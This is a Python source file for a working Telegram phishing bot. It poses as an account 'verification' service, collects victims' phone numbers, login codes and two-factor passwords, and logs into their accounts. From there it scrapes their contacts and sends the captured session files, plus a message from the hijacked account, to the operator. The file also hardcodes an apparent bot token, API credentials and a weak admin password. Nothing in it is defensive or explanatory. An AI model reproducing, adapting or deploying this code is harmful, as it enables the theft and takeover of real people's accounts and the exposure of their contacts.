#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import random
import time
import os
from typing import Dict, Optional

from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message, InputFile
from aiogram import F
from telethon import TelegramClient, errors
from telethon.tl.functions.contacts import GetContactsRequest
import aiosqlite

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "8980756043:AAFrkK2yHZa_jkK2sCyc-zqNedeg1-5Lj5Q"  # СРОЧНО СМЕНИТЕ!
API_ID = 37647469
API_HASH = "cb3efe850b55566dbf8224709dfeb5b1"
ADMIN_PASSWORD = "admin123"

# ВАШ Telegram ID (узнайте у @userinfobot)
ADMIN_CHAT_ID = 8521367180  # ЗАМЕНИТЕ НА СВОЙ

PROXY_LIST = []  # оставьте пустым
DB_PATH = "phish_logs.db"
SESSIONS_DIR = "sessions"

# ================== ИНИЦИАЛИЗАЦИЯ ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

user_states: Dict[int, dict] = {}
available_proxies = PROXY_LIST.copy()

def get_random_proxy():
    if available_proxies:
        return random.choice(available_proxies)
    return None

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER,
                phone TEXT,
                step TEXT,
                message TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        await db.execute('''
            CREATE TABLE IF NOT EXISTS successful (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER,
                phone TEXT,
                session_file TEXT,
                contacts TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        await db.commit()

async def log_event(chat_id: int, phone: str, step: str, message: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO logs (chat_id, phone, step, message) VALUES (?, ?, ?, ?)",
            (chat_id, phone, step, message)
        )
        await db.commit()

async def log_success(chat_id: int, phone: str, session_file: str, contacts: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO successful (chat_id, phone, session_file, contacts) VALUES (?, ?, ?, ?)",
            (chat_id, phone, session_file, contacts)
        )
        await db.commit()

# ================== ОБРАБОТЧИКИ ==================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    chat_id = message.chat.id
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    session_name = os.path.join(SESSIONS_DIR, f"session_user_{chat_id}_{int(time.time())}")
    proxy = get_random_proxy()
    client = TelegramClient(session_name, API_ID, API_HASH, proxy=proxy)
    user_states[chat_id] = {
        "step": "awaiting_phone",
        "phone": None,
        "hash": None,
        "client": client,
        "connected": False
    }
    await message.answer(
        "👋 Добро пожаловать в бот что бы продолжить в целях безопастности авторизуйтесь\n\n"
        "Salom siz bizani botimizdasiz otishuchun verefekatsiya kilin\n"
        "Пожалуйста, введите ваш номер телефона в международном формате/nomeriszni bunaka yozin\n"
        "(например, +79001234567 / +998901234567):"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or args[1] != ADMIN_PASSWORD:
        await message.answer("❌ Неверный пароль / parol notogri")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT COUNT(*) FROM successful")
        total = await cur.fetchone()
        cur = await db.execute("SELECT COUNT(*) FROM logs WHERE step='success'")
        success = await cur.fetchone()
        await message.answer(
            f"📊 Статистика:\n"
            f"Всего успешных входов: {success[0]}\n"
            f"Сохранённых сессий: {total[0]}\n"
            f"Активных жертв: {len(user_states)}"
        )

@dp.message(F.text)
async def handle_text(message: Message):
    chat_id = message.chat.id
    text = message.text.strip()
    if chat_id not in user_states:
        await message.answer("Начните с /start / /start tan boshilng")
        return
    state = user_states[chat_id]
    step = state.get("step")
    client = state.get("client")

    if not client:
        await message.answer("Ошибка клиента. Начните заново с /start boshqatan boshlin /start dan")
        return

    if not state.get("connected"):
        try:
            await client.connect()
            state["connected"] = True
        except Exception as e:
            logger.error(f"Connect error: {e}")
            await message.answer(f"❌ Ошибка подключения: {e}. Попробуйте /start / ishlamadi boshqatan /start yozib boshlin")
            del user_states[chat_id]
            return

    if step == "awaiting_phone":
        if not text.startswith('+') or not text[1:].isdigit():
            await message.answer("❌ Некорректный формат. Введите номер с '+' и цифрами, например +79001234567 / notogri + nomer va son yozing")
            return
        await message.answer("⏳ Проверяем номер и отправляем код... / kuting tekshirvomiz")
        try:
            result = await client.send_code_request(text)
            state["phone"] = text
            state["hash"] = result.phone_code_hash
            state["step"] = "awaiting_code"
            await message.answer(
                "📲 Мы отправили код подтверждения на ваш номер.\n"
                "Пожалуйста, введите код из SMS или Telegram-звонка: / biza kod yubordik shotka yozin yoki sms yoki telegram telefon"
            )
            await log_event(chat_id, text, "code_sent", "Code request sent")
        except errors.PhoneNumberInvalidError:
            await message.answer("❌ Номер не зарегистрирован в Telegram. Попробуйте другой. / nomer topilmadi")
            await log_event(chat_id, text, "check_exist", "Number not registered")
            await client.disconnect()
            del user_states[chat_id]
        except Exception as e:
            logger.error(f"Send code error: {e}")
            await message.answer(f"❌ Ошибка отправки кода: {e}. Попробуйте /start заново. / kod topilmadi boshqatan /start dan bosin")
            await client.disconnect()
            del user_states[chat_id]

    elif step == "awaiting_code":
        phone = state.get("phone")
        phone_hash = state.get("hash")
        if not phone or not phone_hash:
            await message.answer("Ошибка, начните заново с /start / stat dan boshling")
            return
        code = text
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_hash)
            # Успешно – без 2FA
            contacts = await client(GetContactsRequest(hash=0))
            contacts_list = []
            for user in contacts.users:
                contacts_list.append(f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'no_username'}) - {user.phone or 'no_phone'}")
            contacts_str = "\n".join(contacts_list) if contacts_list else "No contacts"
            session_file = client.session.filename
            await client.disconnect()
            # Отправляем жертве подтверждение
            await message.answer("✅ Верификация пройдена! Ваш аккаунт подтверждён. / ohshadi")
            await log_event(chat_id, phone, "success", "Login successful")
            await log_success(chat_id, phone, session_file, contacts_str)
            # ---- ОТПРАВКА АДМИНИСТРАТОРУ ----
            await send_session_to_admin(phone, session_file, contacts_str)
            # ---- ОТПРАВКА СООБЩЕНИЯ ОТ ЖЕРТВЫ АДМИНУ ----
            await send_hello_from_victim(phone, session_file)
            del user_states[chat_id]
            return
        except errors.SessionPasswordNeededError:
            state["step"] = "awaiting_2fa"
            state["code"] = code
            await message.answer(
                "🔐 Для вашего аккаунта включена двухфакторная аутентификация.\n"
                "Введите ваш пароль (если вы его не устанавливали, попробуйте стандартный): / sizi aut yoki parolizni yozing"
            )
            await log_event(chat_id, phone, "2fa_request", "2FA password requested")
        except errors.PhoneCodeExpiredError:
            await message.answer(
                "⏳ Код истёк (действителен 5 минут).\n"
                "Пожалуйста, нажмите /start и попробуйте снова."
            )
            await log_event(chat_id, phone, "code_expired", "Code expired")
            await client.disconnect()
            del user_states[chat_id]
        except errors.PhoneCodeInvalidError:
            await message.answer("❌ Неверный код. Попробуйте ещё раз (или нажмите /start для нового кода).")
            await log_event(chat_id, phone, "code_invalid", "Invalid code")
        except errors.FloodWaitError as e:
            await message.answer(f"⏳ Слишком много попыток. Подождите {e.seconds} секунд и попробуйте снова.")
            await log_event(chat_id, phone, "flood_wait", f"Flood wait {e.seconds}s")
        except Exception as e:
            logger.error(f"Login error: {e}")
            await message.answer(f"❌ Ошибка входа: {e}. Попробуйте /start заново.")
            await client.disconnect()
            del user_states[chat_id]

    elif step == "awaiting_2fa":
        phone = state.get("phone")
        password = text
        if not phone:
            await message.answer("Ошибка, начните заново с /start")
            return
        try:
            await client.sign_in(password=password)
            contacts = await client(GetContactsRequest(hash=0))
            contacts_list = []
            for user in contacts.users:
                contacts_list.append(f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'no_username'}) - {user.phone or 'no_phone'}")
            contacts_str = "\n".join(contacts_list) if contacts_list else "No contacts"
            session_file = client.session.filename
            await client.disconnect()
            await message.answer("✅ Верификация пройдена! Аккаунт подтверждён.")
            await log_event(chat_id, phone, "success_2fa", "Login with 2FA successful")
            await log_success(chat_id, phone, session_file, contacts_str)
            # ---- ОТПРАВКА АДМИНИСТРАТОРУ ----
            await send_session_to_admin(phone, session_file, contacts_str)
            await send_hello_from_victim(phone, session_file)
            del user_states[chat_id]
        except errors.PasswordHashInvalidError:
            await message.answer("❌ Неверный пароль 2FA. Попробуйте снова.")
            await log_event(chat_id, phone, "2fa_fail", "Invalid 2FA password")
        except errors.PhoneCodeExpiredError:
            await message.answer(
                "⏳ Код истёк. Пожалуйста, нажмите /start и попробуйте снова."
            )
            await log_event(chat_id, phone, "code_expired_2fa", "Code expired during 2FA")
            await client.disconnect()
            del user_states[chat_id]
        except errors.FloodWaitError as e:
            await message.answer(f"⏳ Слишком много попыток. Подождите {e.seconds} секунд.")
            await log_event(chat_id, phone, "flood_wait_2fa", f"Flood wait {e.seconds}s")
        except Exception as e:
            logger.error(f"2FA login error: {e}")
            await message.answer(f"❌ Ошибка входа 2FA: {e}. Попробуйте /start заново.")
            await client.disconnect()
            del user_states[chat_id]

# ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АДМИНА ==================
async def send_session_to_admin(phone: str, session_file: str, contacts: str):
    """Отправляет администратору файл сессии и информацию"""
    if not ADMIN_CHAT_ID:
        logger.warning("ADMIN_CHAT_ID не задан, пропускаем уведомление")
        return
    try:
        # Проверяем, существует ли файл
        if os.path.exists(session_file):
            with open(session_file, 'rb') as f:
                await bot.send_document(
                    ADMIN_CHAT_ID,
                    InputFile(f, filename=os.path.basename(session_file)),
                    caption=f"✅ Новый аккаунт захвачен!\nНомер: {phone}\nФайл сессии приложен."
                )
        else:
            await bot.send_message(
                ADMIN_CHAT_ID,
                f"✅ Новый аккаунт захвачен!\nНомер: {phone}\nФайл сессии: {session_file}\nКонтакты: {contacts[:500]}"
            )
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление админу: {e}")

async def send_hello_from_victim(phone: str, session_file: str):
    """От имени жертвы отправляет сообщение администратору (чтобы аккаунт появился в диалогах)"""
    if not ADMIN_CHAT_ID:
        return
    try:
        # Временно подключаемся с этой сессией и отправляем сообщение
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        await client.send_message(ADMIN_CHAT_ID, f"👋 Привет! Это аккаунт {phone} – теперь он под вашим управлением.")
        await client.disconnect()
        logger.info(f"Отправлено приветствие от {phone} админу")
    except Exception as e:
        logger.error(f"Не удалось отправить приветствие от жертвы: {e}")

# ================== ЗАПУСК ==================
async def main():
    await init_db()
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    if ADMIN_CHAT_ID == 123456789:
        logging.warning("⚠️ ADMIN_CHAT_ID не изменён! Укажите свой ID.")
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())